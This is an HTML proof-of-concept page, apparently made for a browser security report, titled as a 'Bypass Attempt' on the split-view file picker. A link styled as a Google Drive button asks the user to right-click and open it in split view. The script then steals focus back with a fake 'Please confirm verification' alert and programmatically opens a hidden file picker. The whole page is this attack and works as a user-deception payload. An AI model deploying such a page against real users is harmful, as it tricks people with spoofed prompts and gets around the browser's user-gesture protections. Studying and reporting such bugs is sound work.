<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Bypass Attempt - Split View File Picker</title>
    <style>
      body {
        font-family: Arial;
        text-align: center;
        padding-top: 50px;
      }
      a {
        display: inline-block;
        padding: 10px;
        background: #1a73e8;
        color: white;
        text-decoration: none;
        border-radius: 4px;
      }
      img {
        max-width: 300px;
        margin-top: 20px;
        display: none;
      }
    </style>
  </head>
  <body>
    <a
      id="trigger"
      href="https://workspace.google.com/intl/en_in/products/drive/"
      >Right Click → Open in Split View</a
    >
    <br />
    <img id="preview" />

    <script>
      const trigger = document.getElementById("trigger");
      const preview = document.getElementById("preview");

      // Buat input file hidden
      const fileInput = document.createElement("input");
      fileInput.type = "file";
      fileInput.accept = "image/*";
      fileInput.style.display = "none";
      document.body.appendChild(fileInput);

      fileInput.onchange = (e) => {
        if (fileInput.files.length) {
          preview.src = URL.createObjectURL(fileInput.files[0]);
          preview.style.display = "block";
          console.log("File selected:", fileInput.files[0].name);
        }
      };

      trigger.addEventListener("contextmenu", async (e) => {
        // Jangan prevent default agar menu konteks browser tetap muncul
        // User akan memilih "Open in Split View"

        // Kita perlu menunda eksekusi agar split view sempat terbuka,
        // tapi harus memfokuskan kembali ke tab ini sebelum file picker.

        // Setelah split view terbuka (asumsi butuh waktu ~500ms)
        setTimeout(async () => {
          // Coba paksa fokus ke tab ini
          window.focus();
          // Bisa juga dengan alert yang memindahkan fokus
          alert("Please confirm verification"); // alert akan memfokuskan tab ini

          // Sekarang coba buka file picker
          fileInput.click();
        }, 1000); // beri waktu split view terbuka
      });
    </script>
  </body>
</html>
